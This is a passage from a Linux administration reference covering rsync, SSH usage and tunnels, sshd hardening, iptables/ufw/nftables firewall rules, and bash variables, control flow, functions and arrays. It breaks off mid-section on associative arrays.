The gold standard for file synchronization — only transfers changed blocks.

```bash
# Basic sync local to remote
rsync -avz /local/dir/ user@remote:/remote/dir/

# -a: archive mode (recursive + preserve permissions, timestamps, symlinks, owner, group)
# -v: verbose
# -z: compress in transit

# Sync remote to local
rsync -avz user@remote:/remote/dir/ /local/dir/

# Dry run (show what would happen without doing it)
rsync -avz --dry-run /src/ /dst/
rsync -avzn /src/ /dst/        # -n is short for --dry-run

# Delete files in destination that don't exist in source (true mirror)
rsync -avz --delete /src/ /dst/

# Exclude files/directories
rsync -avz --exclude='*.tmp' /src/ /dst/
rsync -avz --exclude='.git/' --exclude='node_modules/' /src/ /dst/
rsync -avz --exclude-from='.rsyncignore' /src/ /dst/

# Include specific files only (use with exclude)
rsync -avz --include='*.conf' --exclude='*' /etc/ /backup/etc/

# Show progress
rsync -avz --progress /src/ /dst/
rsync -avz --info=progress2 /src/ /dst/   # cleaner overall progress

# Limit bandwidth (kilobytes/sec)
rsync -avz --bwlimit=5000 /src/ user@remote:/dst/

# Preserve hard links
rsync -avzH /src/ /dst/

# Checksum-based comparison instead of size+time
rsync -avzc /src/ /dst/

# SSH options
rsync -avz -e "ssh -p 2222 -i ~/.ssh/id_servers" /src/ user@remote:/dst/

# Keep partial files (resume-friendly)
rsync -avz --partial /src/ /dst/
rsync -avz --partial --progress /src/ /dst/   # common combo

# Preserve ACLs and extended attributes
rsync -avzAX /src/ /dst/

# Backup changed files to a backup directory
rsync -avz --backup --backup-dir=/backup/$(date +%Y%m%d) /src/ /dst/

# Numeric user/group IDs
rsync -avz --numeric-ids /src/ user@remote:/dst/

# Sync and remove source files after transfer
rsync -avz --remove-source-files /src/ /dst/

# Log to file
rsync -avz --log-file=/var/log/rsync.log /src/ /dst/
```

**Important: trailing slash on source**
- `rsync -av /src/ /dst/` — copies *contents* of src into dst
- `rsync -av /src /dst/` — copies the *directory src itself* into dst (creates /dst/src/)

---

## 8. SSH

### 8.1 ssh — connecting and options

```bash
# Basic connect
ssh user@host
ssh user@192.168.1.10

# Specify port
ssh -p 2222 user@host

# Use a specific key
ssh -i ~/.ssh/id_rsa user@host
ssh -i ~/.ssh/id_servers user@host

# Run a command remotely
ssh user@host 'ls -la /var/log'
ssh user@host 'df -h; free -m'

# Run with pseudo-terminal allocation (needed for interactive commands)
ssh -t user@host 'sudo bash'
ssh -t user@host 'top'

# Verbose (debug connection issues)
ssh -v user@host
ssh -vvv user@host      # maximum verbosity

# Disable host key checking (for scripting, new hosts — insecure)
ssh -o StrictHostKeyChecking=no user@host

# Batch mode (fail instead of prompting)
ssh -o BatchMode=yes user@host 'whoami'

# Use specific config file
ssh -F /path/to/config user@host

# Pass environment variable to remote
ssh -o SendEnv=MY_VAR user@host

# Compress the connection
ssh -C user@host

# Set connect timeout
ssh -o ConnectTimeout=10 user@host

# Keepalive
ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 user@host
```

---

### 8.2 SSH tunnels

```bash
# LOCAL PORT FORWARDING (-L)
# Access remote service via local port
# Format: -L [bind_address:]local_port:target_host:target_port
ssh -L 8080:localhost:80 user@remote        # remote's port 80 → local 8080
ssh -L 5432:db.internal:5432 user@jumphost  # db behind jump host → local 5432
ssh -L 127.0.0.1:3306:10.0.0.5:3306 user@remote  # bind to localhost only

# Practical: access remote PostgreSQL via local client
ssh -L 5432:localhost:5432 -N user@dbserver
# Then: psql -h localhost -p 5432 -U dbuser mydb

# REMOTE PORT FORWARDING (-R)
# Expose local port on the remote server
# Format: -R [bind_address:]remote_port:target_host:target_port
ssh -R 8080:localhost:3000 user@public-server   # remote's 8080 → local 3000
ssh -R 0.0.0.0:80:localhost:8080 user@public-server  # expose to internet

# GatewayPorts must be set in remote sshd_config for -R 0.0.0.0:

# DYNAMIC PORT FORWARDING / SOCKS PROXY (-D)
# Creates a local SOCKS5 proxy that tunnels through SSH
ssh -D 1080 user@remote
# Then configure browser/app to use SOCKS5 proxy 127.0.0.1:1080
# Route all traffic through remote host

# Using SOCKS with curl
curl --socks5-hostname 127.0.0.1:1080 https://example.com

# Using SOCKS with ssh (hop through)
ssh -o ProxyCommand="nc -x 127.0.0.1:1080 %h %p" user@internal-host

# -N: do not execute a remote command (pure tunnel)
ssh -N -L 8080:localhost:80 user@remote

# -f: fork into background after auth
ssh -f -N -L 8080:localhost:80 user@remote

# Combined: background tunnel
ssh -fN -L 8080:localhost:80 user@remote
ssh -fND 1080 user@remote       # background SOCKS proxy

# ProxyJump (hop through a bastion/jump host) — OpenSSH 7.3+
ssh -J user@jumphost user@internal-host
ssh -J user@jump1,user@jump2 user@final-host    # chain jumps

# ProxyCommand (older way, still works)
ssh -o ProxyCommand="ssh -W %h:%p user@jumphost" user@internal-host
```

---

### 8.3 ssh-keygen

```bash
# Generate Ed25519 key (recommended — small, fast, secure)
ssh-keygen -t ed25519 -C "adam@example.com"

# Generate RSA 4096-bit key
ssh-keygen -t rsa -b 4096 -C "adam@example.com"

# Specify output file (default: ~/.ssh/id_ed25519)
ssh-keygen -t ed25519 -f ~/.ssh/id_servers -C "servers key"

# Generate without passphrase (for automation)
ssh-keygen -t ed25519 -f ~/.ssh/deploy_key -N ""

# Show public key fingerprint
ssh-keygen -l -f ~/.ssh/id_ed25519.pub
ssh-keygen -lv -f ~/.ssh/id_ed25519.pub    # visual fingerprint (art)

# Change passphrase on existing key
ssh-keygen -p -f ~/.ssh/id_rsa

# Convert PEM private key to OpenSSH format
ssh-keygen -p -m OpenSSH -f keyfile.pem

# Extract public key from private key
ssh-keygen -y -f ~/.ssh/id_rsa > ~/.ssh/id_rsa.pub

# Generate host keys (for new sshd installation)
ssh-keygen -A
```

---

### 8.4 ssh-copy-id

```bash
# Copy public key to remote (appends to ~/.ssh/authorized_keys)
ssh-copy-id user@remote

# Specific key file
ssh-copy-id -i ~/.ssh/id_servers.pub user@remote

# Non-standard port
ssh-copy-id -i ~/.ssh/id_ed25519.pub -p 2222 user@remote

# Manual equivalent (when ssh-copy-id is unavailable)
cat ~/.ssh/id_ed25519.pub | ssh user@remote "mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
```

---

### 8.5 ssh-agent

```bash
# Start agent and set environment variables
eval "$(ssh-agent -s)"
# Or in current shell: ssh-agent bash

# Add default keys
ssh-add

# Add specific key
ssh-add ~/.ssh/id_servers

# Add with timeout (key removed after 4 hours)
ssh-add -t 14400 ~/.ssh/id_rsa

# List loaded keys
ssh-add -l            # fingerprints
ssh-add -L            # full public keys

# Remove a key
ssh-add -d ~/.ssh/id_rsa

# Remove all keys
ssh-add -D

# Agent forwarding (pass agent to remote so it can use your local keys)
ssh -A user@jumphost
# Now from jumphost you can ssh to internal hosts using your local keys
# Warning: can be exploited if jumphost is compromised
```

---

### 8.6 SSH config file (~/.ssh/config)

```
# ~/.ssh/config — per-host settings (permissions must be 600)

# Global defaults
Host *
    ServerAliveInterval 60
    ServerAliveCountMax 3
    AddKeysToAgent yes
    IdentityFile ~/.ssh/id_ed25519

# Quick alias
Host streaming
    HostName 76.13.103.117
    User root
    IdentityFile ~/.ssh/id_servers

Host backend
    HostName 72.60.225.132
    User root
    IdentityFile ~/.ssh/id_servers

# Jump host configuration
Host internal-*
    ProxyJump bastion
    User admin
    IdentityFile ~/.ssh/id_ed25519

Host bastion
    HostName bastion.example.com
    User ec2-user
    IdentityFile ~/.ssh/bastion_key

# Non-standard port
Host dev-server
    HostName 192.168.1.10
    Port 2222
    User developer

# Disable strict host checking for local network
Host 192.168.1.*
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
```

---

### 8.7 sshd_config hardening

Key settings in `/etc/ssh/sshd_config`:

```
# Disable root login
PermitRootLogin no
# Or allow root with key only:
# PermitRootLogin prohibit-password

# Disable password authentication (keys only)
PasswordAuthentication no
ChallengeResponseAuthentication no
UsePAM yes

# Disable empty passwords
PermitEmptyPasswords no

# Change default port (security through obscurity, but reduces log noise)
Port 2222

# Listen on specific address only
ListenAddress 0.0.0.0
ListenAddress ::

# Allow only specific users
AllowUsers alice bob
# Or specific groups:
AllowGroups sshusers

# Deny specific users
DenyUsers mallory

# Disable X11 forwarding (unless needed)
X11Forwarding no

# Disable TCP forwarding (unless needed)
AllowTcpForwarding no
GatewayPorts no

# Disable agent forwarding (unless needed)
AllowAgentForwarding no

# Max authentication attempts
MaxAuthTries 3

# Login grace time
LoginGraceTime 30

# Idle session timeout
ClientAliveInterval 300
ClientAliveCountMax 2

# Restrict to SSH protocol 2 (protocol 1 is broken)
# (Protocol directive removed in OpenSSH 7.6 — v2 is now the only option)

# Limit who can use public key auth
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys

# Use strong algorithms only
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr
MACs hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,umac-128-etm@openssh.com

# Sftp subsystem
Subsystem sftp /usr/lib/openssh/sftp-server

# After editing, test config before reloading:
# sshd -t
# Then reload: systemctl reload sshd
```

---

### 8.8 known_hosts

```bash
# Location: ~/.ssh/known_hosts (per-user) or /etc/ssh/ssh_known_hosts (system-wide)

# View known hosts
cat ~/.ssh/known_hosts

# Lookup a host in known_hosts
ssh-keygen -F hostname
ssh-keygen -F 192.168.1.1

# Remove a host's entry (when host key changes)
ssh-keygen -R hostname
ssh-keygen -R 192.168.1.1

# Manually add a host key
ssh-keyscan -H hostname >> ~/.ssh/known_hosts
ssh-keyscan -H -p 2222 hostname >> ~/.ssh/known_hosts
ssh-keyscan -t ed25519 hostname >> ~/.ssh/known_hosts

# Hashed known_hosts (more secure — default in modern openssh)
# The -H flag in ssh-keyscan hashes the hostname
ssh-keyscan -H hostname >> ~/.ssh/known_hosts

# Bypass known_hosts for a host (useful for ephemeral VMs)
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@host
```

---

## 9. Firewall

### 9.1 iptables

Netfilter packet filter — controls what traffic enters, leaves, and is forwarded.

#### Concepts

**Tables:** `filter` (default), `nat`, `mangle`, `raw`, `security`

**Chains per table:**

| Table | Chains |
|-------|--------|
| filter | INPUT, OUTPUT, FORWARD |
| nat | PREROUTING, POSTROUTING, OUTPUT |
| mangle | PREROUTING, INPUT, FORWARD, OUTPUT, POSTROUTING |

**Packet flow:**
```
INCOMING → PREROUTING → routing decision
  → FORWARD (if forwarded) → POSTROUTING → OUT
  → INPUT (if for local) → local process
  
LOCAL → OUTPUT → routing decision → POSTROUTING → OUT
```

**Targets (what to do):** `ACCEPT`, `DROP`, `REJECT`, `LOG`, `DNAT`, `SNAT`, `MASQUERADE`, `REDIRECT`, `MARK`

#### Viewing rules

```bash
# List filter rules (default table)
iptables -L
iptables -L -v           # with packet/byte counts
iptables -L -n           # numeric (no DNS)
iptables -L -v -n
iptables -L --line-numbers  # show rule numbers

# Specific chain
iptables -L INPUT -v -n --line-numbers

# All tables
iptables -L -t filter
iptables -L -t nat
iptables -L -t mangle

# Show as commands (useful for scripts)
iptables-save
iptables-save > /etc/iptables/rules.v4
```

#### Managing rules

```bash
# APPEND a rule (add at end)
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# INSERT a rule (add at position, default=1 = top)
iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT

# DELETE a rule by specification
iptables -D INPUT -p tcp --dport 22 -j ACCEPT

# DELETE by rule number
iptables -D INPUT 3

# REPLACE a rule at position
iptables -R INPUT 3 -p tcp --dport 8080 -j ACCEPT

# FLUSH (delete all rules from chain)
iptables -F             # flush filter table
iptables -F INPUT       # flush only INPUT
iptables -F -t nat      # flush NAT table

# Zero counters
iptables -Z
iptables -Z INPUT
```

#### Common filter rules

```bash
# Accept established/related connections (must be early in INPUT)
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Accept loopback
iptables -A INPUT -i lo -j ACCEPT

# Accept SSH
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Accept HTTP/HTTPS
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Accept from specific IP
iptables -A INPUT -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -s 203.0.113.5 -p tcp --dport 22 -j ACCEPT

# Reject everything else (with ICMP port unreachable)
iptables -A INPUT -j REJECT --reject-with icmp-port-unreachable

# Or silently drop
iptables -A INPUT -j DROP

# Set default policies
iptables -P INPUT DROP      # default DROP for INPUT
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Rate limiting (protect against brute force)
iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
         -m recent --set --name SSH
iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
         -m recent --update --seconds 60 --hitcount 4 --name SSH \
         -j DROP

# ICMP ping control
iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT
iptables -A INPUT -p icmp -j DROP          # block all other ICMP

# Block specific port
iptables -A INPUT -p tcp --dport 23 -j DROP   # block telnet

# Log dropped packets
iptables -A INPUT -j LOG --log-prefix "iptables-drop: " --log-level 4
iptables -A INPUT -j DROP

# Match multiple ports
iptables -A INPUT -p tcp -m multiport --dports 80,443,8080 -j ACCEPT

# Match source port
iptables -A INPUT -p tcp --sport 1024:65535 -j ACCEPT

# Limit connections per IP
iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 50 -j DROP
```

#### NAT rules

```bash
# MASQUERADE (dynamic SNAT — use when source IP changes, e.g. DHCP)
# Enable IP forwarding first:
echo 1 > /proc/sys/net/ipv4/ip_forward

# MASQUERADE all outbound traffic on eth0
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Static SNAT (fixed source IP)
iptables -t nat -A POSTROUTING -o eth0 -j SNAT --to-source 203.0.113.1

# DNAT — forward incoming port 80 to internal server
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.10:80

# Port forwarding: external 8080 → internal 80
iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 192.168.1.10:80
iptables -A FORWARD -d 192.168.1.10 -p tcp --dport 80 -j ACCEPT

# REDIRECT local port (transparent proxy)
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128
```

#### Saving and restoring

```bash
# Save current rules
iptables-save > /etc/iptables/rules.v4
ip6tables-save > /etc/iptables/rules.v6

# Restore rules
iptables-restore < /etc/iptables/rules.v4

# Persist across reboots (Debian/Ubuntu)
apt install iptables-persistent
netfilter-persistent save
netfilter-persistent reload
```

---

### 9.2 ufw (Uncomplicated Firewall)

Frontend for iptables — easier syntax, less power.

```bash
# Check status
ufw status
ufw status verbose
ufw status numbered    # show rule numbers

# Enable / disable
ufw enable
ufw disable

# Reset to defaults (deletes all rules)
ufw reset

# Default policies
ufw default deny incoming
ufw default allow outgoing
ufw default deny forward

# Allow / deny by port
ufw allow 22
ufw allow 80
ufw allow 443
ufw deny 23

# Allow by protocol
ufw allow 22/tcp
ufw allow 53/udp

# Allow by service name (from /etc/services)
ufw allow ssh
ufw allow http
ufw allow https

# Allow from specific IP
ufw allow from 192.168.1.0/24
ufw allow from 203.0.113.5

# Allow from IP to specific port
ufw allow from 192.168.1.0/24 to any port 22
ufw allow from 203.0.113.5 to any port 443 proto tcp

# Delete rules
ufw delete allow 80
ufw delete 3          # by rule number from 'ufw status numbered'

# Rate limiting (SSH brute force protection)
ufw limit ssh
ufw limit 22/tcp

# Allow application profile
ufw app list
ufw allow 'Nginx Full'
ufw allow 'OpenSSH'

# Logging
ufw logging on
ufw logging off
ufw logging medium    # levels: off, low, medium, high, full

# Reload
ufw reload
```

---

### 9.3 nftables

The modern replacement for iptables. Available in kernel 3.13+, default on Debian 10+, Ubuntu 20.04+.

```bash
# Check current ruleset
nft list ruleset

# List tables
nft list tables

# List a specific table
nft list table inet filter

# Create a table
nft add table inet filter

# Create chains
nft add chain inet filter input   '{ type filter hook input priority 0; policy drop; }'
nft add chain inet filter output  '{ type filter hook output priority 0; policy accept; }'
nft add chain inet filter forward '{ type filter hook forward priority 0; policy drop; }'

# Add rules
nft add rule inet filter input ct state established,related accept
nft add rule inet filter input iif lo accept
nft add rule inet filter input tcp dport 22 accept
nft add rule inet filter input tcp dport { 80, 443 } accept
nft add rule inet filter input drop

# Insert rule at position 0 (first)
nft insert rule inet filter input position 0 ct state established,related accept

# Delete a rule (get handle first)
nft list table inet filter --handle
nft delete rule inet filter input handle 5

# NAT table
nft add table ip nat
nft add chain ip nat postrouting '{ type nat hook postrouting priority 100; }'
nft add rule ip nat postrouting oif eth0 masquerade

# Port forwarding
nft add chain ip nat prerouting '{ type nat hook prerouting priority -100; }'
nft add rule ip nat prerouting tcp dport 80 dnat to 192.168.1.10:80

# Flush a chain
nft flush chain inet filter input

# Flush entire ruleset
nft flush ruleset

# Save and load
nft list ruleset > /etc/nftables.conf
nft -f /etc/nftables.conf

# Enable nftables service (systemd)
systemctl enable nftables
systemctl start nftables
```

**Basic nftables ruleset template:**

```
#!/usr/sbin/nft -f
flush ruleset

table inet filter {
    chain input {
        type filter hook input priority 0; policy drop;

        ct state invalid drop
        ct state established,related accept
        iif "lo" accept

        tcp dport 22 accept
        tcp dport { 80, 443 } accept

        ip protocol icmp accept
        ip6 nexthdr icmpv6 accept

        log prefix "nft-drop: " drop
    }

    chain output {
        type filter hook output priority 0; policy accept;
    }

    chain forward {
        type filter hook forward priority 0; policy drop;
    }
}
```

---

## 10. Bash fundamentals

### 10.1 Shebang

```bash
#!/usr/bin/env bash     # PREFERRED: uses env to find bash — portable
#!/bin/bash             # Hardcoded path — works on most Linux
#!/bin/sh               # POSIX sh only — no bash extensions
```

Why `#!/usr/bin/env bash` is preferred: `bash` may be at `/usr/local/bin/bash` (e.g. macOS with Homebrew), and `env` finds it correctly. `/bin/bash` is safe on Linux in practice.

---

### 10.2 Variables

```bash
# Assignment — NO spaces around =
name="Adam"
count=42
path=/usr/local/bin

# Reference with $
echo "$name"
echo "Count: $count"

# Curly braces — required when immediately followed by more text
echo "${name}_backup"
echo "Value: ${count}px"

# Unset variable — empty string or unset
unset myvar
echo "${myvar:-default}"    # use 'default' if unset or empty
echo "${myvar:=default}"    # assign and use 'default' if unset or empty
echo "${myvar:?error msg}"  # exit with error if unset or empty
echo "${myvar:+alt}"        # use 'alt' only if myvar IS set (non-empty)

# Read-only variables
readonly PI=3.14159
declare -r MAX=100

# Integer variables (arithmetic without $(()))
declare -i total=0
total+=5          # arithmetic addition

# Uppercase/lowercase (bash 4+)
declare -u upper="hello"    # auto-uppercased
declare -l lower="HELLO"    # auto-lowercased

# String length
echo ${#name}            # number of characters

# Substring extraction
s="Hello World"
echo ${s:0:5}            # Hello (offset 0, length 5)
echo ${s:6}              # World (from offset 6 to end)
echo ${s: -5}            # World (last 5 chars — note space before -)

# String replacement
path="/home/user/file.txt"
echo ${path/user/admin}      # replace first occurrence
echo ${path//u/U}            # replace all occurrences
echo ${path#/home/}          # remove shortest prefix match
echo ${path##*/}             # remove longest prefix match (basename)
echo ${path%.*}              # remove shortest suffix match
echo ${path%%/*}             # remove longest suffix match

# Basename / dirname using parameter expansion (no subprocess)
file="/var/log/syslog"
echo ${file##*/}     # syslog     (basename equivalent)
echo ${file%/*}      # /var/log   (dirname equivalent)
```

---

### 10.3 Quoting rules

```bash
# SINGLE QUOTES — literal, no interpretation
echo 'Hello $USER'          # prints: Hello $USER
echo 'It'\''s a test'       # embed a single quote: It's a test

# DOUBLE QUOTES — interpret $ and ` and \ but not * ? []
echo "Hello $USER"          # prints: Hello adam
echo "Home: ${HOME}"        # variable expansion
echo "Date: $(date)"        # command substitution
echo "Tab:\t Newline:\n"    # no interpretation (\t and \n are NOT escape sequences here)
echo -e "Tab:\t Newline:\n" # need -e for escape sequences with echo
printf "Tab:\t Newline:\n"  # printf always interprets escapes

# BACKTICKS `` — command substitution (legacy, avoid)
output=`ls -la`             # old style
output=$(ls -la)            # PREFERRED: $() — nestable, readable

# $() — command substitution (preferred)
files=$(ls /etc)
count=$(wc -l < /etc/passwd)
host=$(hostname -f)

# $(()) — arithmetic expansion
echo $((2 + 3))             # 5
echo $((10 / 3))            # 3 (integer division)
echo $((10 % 3))            # 1 (modulo)
result=$((count * 2 + 1))

# $'...' — ANSI-C quoting (interpretes \n, \t, \x, etc.)
echo $'Hello\tWorld\n'      # tab and newline are interpreted
path=$'/path/with spaces/file'

# Quoting the expansion of arrays and "$@"
for arg in "$@"; do         # each argument as a separate word
    echo "$arg"
done
# vs "$*" — all arguments as ONE word: "arg1 arg2 arg3"
```

---

## 11. Control flow

### 11.1 if / elif / else

```bash
# Basic form
if CONDITION; then
    COMMANDS
elif OTHER_CONDITION; then
    OTHER_COMMANDS
else
    FALLBACK
fi

# One-liner (semicolons replace newlines)
if [ -f /etc/passwd ]; then echo "exists"; fi
```

---

### 11.2 test, [ ], and [[ ]]

**File tests:**

```bash
[ -e file ]     # exists (any type)
[ -f file ]     # regular file
[ -d dir  ]     # directory
[ -l file ]     # symbolic link
[ -r file ]     # readable
[ -w file ]     # writable
[ -x file ]     # executable
[ -s file ]     # exists and non-empty (size > 0)
[ -z file ]     # True if file has zero length (for strings: -z str)
[ file1 -nt file2 ]  # file1 newer than file2
[ file1 -ot file2 ]  # file1 older than file2
```

**String tests:**

```bash
[ -z "$str" ]         # true if string is empty (zero length)
[ -n "$str" ]         # true if string is non-empty
[ "$str" = "val" ]    # string equality (POSIX)
[ "$str" != "val" ]   # string inequality
[[ "$str" == "val" ]] # bash string equality
[[ "$str" =~ ^[0-9]+$ ]]  # regex match (only in [[]])
```

**Integer tests:**

```bash
[ "$a" -eq "$b" ]   # equal
[ "$a" -ne "$b" ]   # not equal
[ "$a" -lt "$b" ]   # less than
[ "$a" -le "$b" ]   # less than or equal
[ "$a" -gt "$b" ]   # greater than
[ "$a" -ge "$b" ]   # greater than or equal
```

**Combining conditions:**

```bash
# POSIX [ ] — use -a (and) and -o (or)
[ -f file -a -r file ]         # file exists AND is readable
[ -z "$a" -o -z "$b" ]         # a is empty OR b is empty

# [[ ]] — use && and ||
[[ -f file && -r file ]]        # cleaner, safer
[[ -z "$a" || -z "$b" ]]

# Negation
[ ! -f file ]
[[ ! -d dir ]]
```

**[[ ]] vs [ ] key differences:**

| Feature | `[ ]` | `[[ ]]` |
|---------|-------|---------|
| Word splitting in vars | Yes — quote everything | No — safe without quotes |
| `&&` / `||` inside | No | Yes |
| `=~` regex | No | Yes |
| Globbing | No | Yes (`==` with `*`) |
| `>` / `<` string compare | Need `\>` | Direct |

---

### 11.3 case

```bash
case "$variable" in
    pattern1)
        commands
        ;;
    pattern2|pattern3)    # multiple patterns with |
        commands
        ;;
    prefix*)              # glob pattern
        commands
        ;;
    [0-9])               # character class
        commands
        ;;
    *)                   # default/catch-all
        commands
        ;;
esac

# Example: parse CLI option
case "$1" in
    start)   systemctl start nginx ;;
    stop)    systemctl stop nginx ;;
    restart) systemctl restart nginx ;;
    status)  systemctl status nginx ;;
    *)       echo "Usage: $0 {start|stop|restart|status}"; exit 1 ;;
esac

# case with fallthrough (;&) — execute next pattern too (bash 4+)
case "$OS" in
    ubuntu)
        ;&   # fallthrough
    debian)
        apt install -y vim
        ;;
    fedora)
        dnf install -y vim
        ;;
esac
```

---

### 11.4 for loops

```bash
# List-style for
for item in a b c d; do
    echo "$item"
done

# Iterate over files
for file in /etc/*.conf; do
    echo "Processing: $file"
done

# Iterate over command output
for user in $(cut -d: -f1 /etc/passwd); do
    echo "$user"
done

# Iterate over array
fruits=("apple" "banana" "cherry")
for fruit in "${fruits[@]}"; do
    echo "$fruit"
done

# C-style for loop
for ((i=0; i<10; i++)); do
    echo "$i"
done

# Step by 2
for ((i=0; i<=20; i+=2)); do
    printf "%d " "$i"
done; echo

# Count down
for ((i=10; i>=0; i--)); do
    printf "%d " "$i"
done; echo

# Iterate over a range (brace expansion)
for i in {1..10}; do
    echo "$i"
done

# Range with step
for i in {0..100..10}; do
    echo "$i"
done

# Iterate over lines of a file (safer than $(cat file))
while IFS= read -r line; do
    echo "$line"
done < /etc/hosts
```

---

### 11.5 while and until

```bash
# while — loop while condition is TRUE
count=0
while [ "$count" -lt 10 ]; do
    echo "$count"
    ((count++))
done

# while with command (loop while command succeeds)
while ping -c1 -W1 8.8.8.8 &>/dev/null; do
    echo "Network up"
    sleep 5
done

# Infinite loop
while true; do
    echo "Running..."
    sleep 1
done

# Read lines from stdin or file
while IFS= read -r line; do
    echo "Line: $line"
done < /var/log/syslog

# Read with multiple fields
while IFS=: read -r user pass uid gid gecos home shell; do
    echo "User: $user  Shell: $shell"
done < /etc/passwd

# until — loop while condition is FALSE (opposite of while)
until [ -f /tmp/done.flag ]; do
    echo "Waiting for flag..."
    sleep 2
done
echo "Flag found, continuing"
```

---

### 11.6 break and continue

```bash
# break — exit the loop
for i in {1..10}; do
    if [ "$i" -eq 5 ]; then
        break
    fi
    echo "$i"
done    # prints 1 2 3 4

# break N — break out of N levels of nested loops
for i in {1..3}; do
    for j in {1..3}; do
        if [ "$i" -eq 2 ] && [ "$j" -eq 2 ]; then
            break 2    # exits both loops
        fi
        echo "$i $j"
    done
done

# continue — skip to next iteration
for i in {1..10}; do
    if (( i % 2 == 0 )); then
        continue    # skip even numbers
    fi
    echo "$i"
done    # prints 1 3 5 7 9

# continue N — continue in Nth enclosing loop
```

---

### 11.7 select

Interactive menu loop (reads from user input).

```bash
PS3="Choose an option: "    # prompt shown to user
options=("Start server" "Stop server" "Check status" "Quit")

select choice in "${options[@]}"; do
    case "$choice" in
        "Start server")
            echo "Starting..."
            ;;
        "Stop server")
            echo "Stopping..."
            ;;
        "Check status")
            systemctl status nginx
            ;;
        "Quit")
            break
            ;;
        *)
            echo "Invalid option: $REPLY"
            ;;
    esac
done
```

---

## 12. Functions

### 12.1 Definition

```bash
# Syntax 1: function keyword
function greet() {
    echo "Hello, $1"
}

# Syntax 2: POSIX — more portable, also works in bash
greet() {
    echo "Hello, $1"
}

# Call a function (no parentheses when calling)
greet "Adam"
greet World
```

---

### 12.2 Arguments

```bash
describe() {
    echo "Function name: ${FUNCNAME[0]}"
    echo "Number of args: $#"
    echo "All args: $*"
    echo "All args (array): $@"
    echo "First arg: $1"
    echo "Second arg: $2"
}

describe "hello" "world"
```

---

### 12.3 Local variables

```bash
# Without local, variables are global (can pollute calling scope)
bad_example() {
    result=42          # global — bad practice
}

good_example() {
    local result=42    # local to this function
    local -i count=0   # local integer
    local -a items=()  # local array
    echo "$result"
}

# Demonstrate scope
x=10
modify() {
    local x=20    # local x
    echo "Inside: x=$x"
}
modify
echo "Outside: x=$x"    # still 10
```

---

### 12.4 Return values

```bash
# $? holds exit status of last command (0=success, 1-255=error)
# Functions can return 0-255 via 'return'
# For actual data, use echo + command substitution or a global variable

is_even() {
    local n=$1
    if (( n % 2 == 0 )); then
        return 0    # success / true
    else
        return 1    # failure / false
    fi
}

if is_even 4; then echo "Even"; else echo "Odd"; fi
if is_even 7; then echo "Even"; else echo "Odd"; fi

# Return data via echo (captured with $())
get_username() {
    local uid=$1
    getent passwd "$uid" | cut -d: -f1
}

username=$(get_username 1000)
echo "User: $username"

# Return data via a nameref (bash 4.3+) — avoids subshell
compute() {
    local -n _result=$1    # nameref to caller's variable
    local input=$2
    _result=$(( input * input ))
}

my_result=0
compute my_result 7
echo "7 squared = $my_result"
```

---

### 12.5 Useful function patterns

```bash
# Error handling wrapper
die() {
    echo "ERROR: $*" >&2
    exit 1
}

require_root() {
    [ "$(id -u)" -eq 0 ] || die "This script requires root privileges"
}

# Logging function
log() {
    local level=$1; shift
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$level] $*" >&2
}
log INFO "Starting process"
log ERROR "Something went wrong"

# Retry function
retry() {
    local -r max_attempts=$1; shift
    local -r delay=$1; shift
    local attempt=1
    until "$@"; do
        if (( attempt >= max_attempts )); then
            echo "Command failed after $attempt attempts" >&2
            return 1
        fi
        echo "Attempt $attempt failed. Retrying in ${delay}s..." >&2
        sleep "$delay"
        ((attempt++))
    done
}

retry 3 5 curl -s https://api.example.com/health
```

---

## 13. Arrays

### 13.1 Indexed arrays

```bash
# Declare
declare -a fruits
fruits=("apple" "banana" "cherry")

# Assign individual elements
fruits[0]="apple"
fruits[1]="banana"
fruits[3]="date"     # index 2 is undefined — sparse arrays are OK

# Append
fruits+=("elderberry")
fruits+=("fig" "grape")    # append multiple

# Access elements
echo "${fruits[0]}"         # apple
echo "${fruits[@]}"         # all elements (as separate words)
echo "${fruits[*]}"         # all elements (as one word — use [@] for iteration)
echo "${#fruits[@]}"        # number of elements
echo "${!fruits[@]}"        # all indices

# Slice
echo "${fruits[@]:1:2}"     # 2 elements starting at index 1

# Iterate
for fruit in "${fruits[@]}"; do
    echo "$fruit"
done

# Iterate with index
for i in "${!fruits[@]}"; do
    echo "$i: ${fruits[$i]}"
done

# Delete element
unset fruits[1]

# Delete entire array
unset fruits

# Read into array
IFS= read -r -a words <<< "one two three"
mapfile -t lines < /etc/hosts    # read file into array, one line per element

# Length of one element
echo "${#fruits[0]}"
```

---

### 13.2 Associative arrays (hash maps)

Requires bash 4+.

```bash
# Declare (required for associative arrays)
declare -A config

# Assign
config["host"]="localhost"
config["port"]="5432"
config["db"]="myapp"

# Inline initialization
declare -A colors=([red]="#ff0000" [green]="#00ff00" [blue]="#0000ff")

# Access
echo "${config["host"]}"
echo "${config[port]}"      # quotes optional but recommended

# Check if key exists
